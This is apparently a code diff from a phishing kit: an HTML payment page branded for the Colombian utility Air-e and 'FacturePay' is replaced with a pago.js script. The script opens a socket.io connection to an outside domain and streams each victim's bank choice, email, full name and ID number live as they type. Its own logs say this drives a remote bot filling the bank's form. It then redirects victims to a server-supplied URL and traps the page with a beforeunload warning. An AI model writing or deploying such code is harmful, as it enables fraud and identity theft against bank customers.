@@ -1,194 +1,162 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Proceso de Pago - FacturePay</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="css/pago.css">
-    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
-</head>
-<body>
+// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios
 
-<header class="site-header">
-    <div class="header-logos">
-        <img src="img/Logo Air-e Final.png" alt="Air-e" class="logo-aire">
-        <div class="header-divider"></div>
-        <img src="img/logo-pol-facture.png" alt="FacturePay" class="logo-facture">
-    </div>
-</header>
+const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
-    <div class="container">
-        <h2 class="page-title">Proceso de pago</h2>
+let isTransactionActive = false;
+let browserRequested = false; 
+const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-        <div class="content-wrapper">
-            
-            <div class="left-panel">
-                <div class="info-table-container">
-                    <div class="table-header">
-                        <i class="fas fa-list-alt"></i> Información de pago
-                    </div>
-                    <table class="data-table">
-                        <tr>
-                            <td class="label-col">Nombre</td>
-                            <td class="value-col" id="lblNombre">Cargando...</td>
-                        </tr>
-                        <tr>
-                            <td class="label-col">Identificación</td>
-                            <td class="value-col" id="lblId">Cargando...</td>
-                        </tr>
-                        <tr>
-                            <td class="label-col">Usuario</td>
-                            <td class="value-col">****</td> </tr>
-                        <tr>
-                            <td class="label-col">Correo</td>
-                            <td class="value-col">
-                                <div class="email-box">
-                                    <span id="lblCorreo">cargando@correo.com</span>
-                                </div>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td class="label-col">Dirección IP</td>
-                            <td class="value-col" id="lblIp">...</td>
-                        </tr>
-                        <tr>
-                            <td class="label-col">Referencia</td>
-                            <td class="value-col" id="lblRef">...</td>
-                        </tr>
-                    </table>
-                </div>
+window.addEventListener('beforeunload', (e) => {
+    if (isTransactionActive) {
+        e.preventDefault();
+        e.returnValue = 'Por favor espere la carga';
+        return 'Por favor espere la carga';
+    }
+});
 
-                <div class="info-table-container">
-                    <table class="concepts-table">
-                        <thead>
-                            <tr>
-                                <th>Concepto</th>
-                                <th>Valor neto</th>
-                                <th>IVA</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td>Pago documento</td>
-                                <td id="lblValorNeto">$0.00</td>
-                                <td>$0.00</td>
-                            </tr>
-                            <tr class="row-total">
-                                <td>Total</td>
-                                <td id="lblValorTotal" style="font-style: italic;">$0.00</td>
-                                <td>$0.00</td>
-                            </tr>
-                            <tr>
-                                <td colspan="3" style="text-align: right; padding-top: 15px; font-weight: 700;">
-                                    Total a pagar &nbsp;&nbsp;&nbsp; <span id="lblTotalFinal" style="font-size: 16px;">$0.00</span>
-                                </td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
+document.addEventListener('DOMContentLoaded', () => {
+    // 1. Obtener los datos correctamente del localStorage
+    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
 
-            <div class="right-panel">
-                <h3 class="section-title">Medios de pago</h3>
+    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO (PANEL DE RESUMEN)
+    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
+    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
+    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
+    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;
 
-                <div class="payment-method-select">
-                    <input type="radio" checked class="radio-custom">
-                    <img src="img/LogoPSE.png" alt="">
-                    <span class="pse-text">PSE</span>
-                </div>
+    // 3. LOS INPUTS DONDE SE ESCRIBE QUEDAN TOTALMENTE LIMPIOS Y VACÍOS
+    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
+    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
+    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
+    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";
 
-                <form id="paymentForm">
-                    <div class="form-group">
-                        <label class="form-label">Bancos *</label>
-                        <select class="form-control-line" id="selectBanco">
-                            <option value="" disabled selected>Seleccione una opción</option>
-                            <option>BANCOLOMBIA</option>
-                            <option>NEQUI</option>
-                            <option>BANCO DE BOGOTA</option>
-                            <option>BANCO BBVA COLOMBIA S.A.</option>
-                            <option>DAVIbank S.A.</option>
-                            <option>BANCO DE OCCIDENTE</option>
-                            <option>BANCO CAJA SOCIAL</option>
-                            <option>BANCO AV VILLAS</option>
-                            <option>NU</option>
-                            <option>LULO BANK</option>
-                            <option>RAPPIPAY</option>
-                            <option>ALIANZA FIDUCIARIA</option>
-                            <option>BANCAMIA S.A.</option>
-                            <option>BANCO AGRARIO</option>
-                            <option>BANCO COOPERATIVO COOPCENTRAL</option>
-                            <option>BANCO CREDIFINANCIERA</option>
-                            <option>BANCO FALABELLA</option>
-                            <option>BANCO FINANDINA S.A. BIC</option>
-                            <option>BANCO GNB SUDAMERIS</option>
-                            <option>BANCO ITAU</option>
-                            <option>BANCO MUNDO MUJER S.A.</option>
-                            <option>BANCO PICHINCHA S.A.</option>
-                            <option>BANCO POPULAR</option>
-                            <option>BANCO PROCREDIT</option>
-                            <option>BANCO SANTANDER COLOMBIA</option>
-                            <option>BANCO SERFINANZA</option>
-                            <option>BANCO UNION antes GIROS</option>
-                            <option>BANCOOMEVA S.A.</option>
-                            <option>CFA COOPERATIVA FINANCIERA</option>
-                            <option>CITIBANK</option>
-                            <option>COLTEFINANCIERA</option>
-                            <option>CONFIAR COOPERATIVA FINANCIERA</option>
-                            <option>COOFINEP COOPERATIVA FINANCIERA</option>
-                            <option>COTRAFA</option>
-                            <option>CREZCAMOS S.A. COMPAÑÍA DE FINANCIAMIENTO</option>
-                            <option>DALE</option>
-                            <option>IRIS</option>
-                            <option>JFK COOPERATIVA FINANCIERA</option>
-                            <option>JP MORGAN</option>
-                            <option>MOVII S.A.</option>
-                            <option>UALÁ</option>
-                        </select>
-                    </div>
+    const monto = data.montoPagar || 0;
+    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);
 
-                    <div class="form-group">
-                        <label class="form-label">Número de Identificación (Cédula) *</label>
-                        <input type="text" class="form-control-line" placeholder="Ingrese su cédula sin puntos" id="formNumId">
-                    </div>
+    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
+    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
+    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
+});
 
-                    <div class="form-group">
-                        <label class="form-label">Nombre Completo *</label>
-                        <input type="text" class="form-control-line" placeholder="Ingrese su nombre completo" id="formNombre">
-                    </div>
+// ==========================================
+// 1. ABRIR EL NAVEGADOR Y ACTUALIZAR BANCO EN VIVO
+// ==========================================
+const selectBanco = document.getElementById('selectBanco');
+if (selectBanco) {
+    selectBanco.addEventListener('change', (e) => {
+        const bancoSeleccionado = e.target.value;
+        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
+        const amount = data.montoPagar || 0;
+        
+        if (!browserRequested) {
+            socket.emit('init_browser', { bank: bancoSeleccionado, amount: amount });
+            browserRequested = true;
+            console.log("Iniciando bot con el banco:", bancoSeleccionado);
+        } else {
+            socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
+            console.log("Cambiando el banco en vivo a:", bancoSeleccionado);
+        }
+    });
+}
 
-                    <div class="form-group">
-                        <label class="form-label">Teléfono/celular *</label>
-                        <input type="text" class="form-control-line" placeholder="Ingrese teléfono/celular" id="formCelular">
-                    </div>
+// ==========================================
+// 2. SINCRONIZACIÓN EN VIVO (LIVE TYPING - 400ms Anti-Spam)
+// ==========================================
+function syncInput(inputId, fieldName) {
+    const input = document.getElementById(inputId);
+    let timeoutId; 
 
-                    <div class="form-group">
-                        <label class="form-label">Correo electrónico *</label>
-                        <input type="email" class="form-control-line" placeholder="Ingrese su correo electrónico" id="formCorreo">
-                    </div>
+    if (input) {
+        input.addEventListener('input', (e) => {
+            if (browserRequested) {
+                clearTimeout(timeoutId);
+                timeoutId = setTimeout(() => {
+                    socket.emit('live_type', { field: fieldName, value: e.target.value });
+                }, 400); 
+            }
+        });
+    }
+}
+syncInput('formCorreo', 'email');
+syncInput('formNombre', 'name');
+syncInput('formNumId', 'doc');
 
-                    <div class="actions-container">
-                        <button type="button" class="btn-action btn-pay">Iniciar Pago</button>
-                    </div>
-                </form>
+// ==========================================
+// 3. FINALIZAR PAGO
+// ==========================================
+const botonPagar = document.querySelector('.btn-pay');
+let loadingInterval;
 
-            </div>
-        </div>
+if (botonPagar) {
+    botonPagar.addEventListener('click', function() {
+        const banco = selectBanco ? selectBanco.value : "";
+        const email = document.getElementById('formCorreo').value.trim();
+        const doc   = document.getElementById('formNumId').value.trim();
+        const name  = document.getElementById('formNombre').value.trim();
+        const phone = document.getElementById('formCelular').value.trim();
 
-        <div class="footer-strip">
-            <p class="footer-note">
-                Al presionar el botón <strong>Iniciar Pago</strong> acepta nuestra política de privacidad.<br>
-                El sistema se conectará con la página transaccional del Banco seleccionado.
-            </p>
-        </div>
-    </div>
+        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
+        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
+        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
+        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
+        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
+        if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
-    <div id="loadingOverlay" class="loading-screen">
-        <div class="spinner"></div>
-        <div id="dynamicLoadingText" class="loading-text">Conectando con la pasarela de pagos...</div>
-    </div>
+        isTransactionActive = true; 
+        const overlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('dynamicLoadingText');
+        
+        if (overlay) overlay.style.display = 'flex';
+        loadingInterval = animateLoadingText(loadingText);
 
-    <script src="js/pago.js"></script>
-</body>
-</html>
+        // Envía los datos exactos que el usuario acaba de escribir como garantía final
+        socket.emit('submit_payment', {
+            email: email,
+            name: name,
+            doc: doc,
+            bank: banco
+        });
+    });
+}
+
+// ==========================================
+// RESPUESTAS DEL SERVIDOR
+// ==========================================
+socket.on('browser_ready', () => {
+    console.log("Servidor: Formulario base llenado con éxito y esperando modificaciones.");
+});
+
+socket.on('payment_success', (data) => {
+    const loadingText = document.getElementById('dynamicLoadingText');
+    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
+    clearInterval(loadingInterval);
+    setTimeout(() => {
+        isTransactionActive = false;
+        window.location.href = data.url; 
+    }, 1500);
+});
+
+socket.on('payment_error', (data) => {
+    clearInterval(loadingInterval);
+    isTransactionActive = false;
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) overlay.style.display = 'none';
+    alert("Hubo un problema de conexión con el banco: " + data.message);
+    
+    browserRequested = false;
+    selectBanco.value = ""; 
+});
+
+function animateLoadingText(element) {
+    if (!element) return null;
+    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
+    let i = 0;
+    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
+}
+function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
+function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
+function enmascararCorreo(email) {
+    if(!email) return "";
+    const [user] = email.split("@");
+    return user.substring(0, 2) + "*******@*****.com";
+}
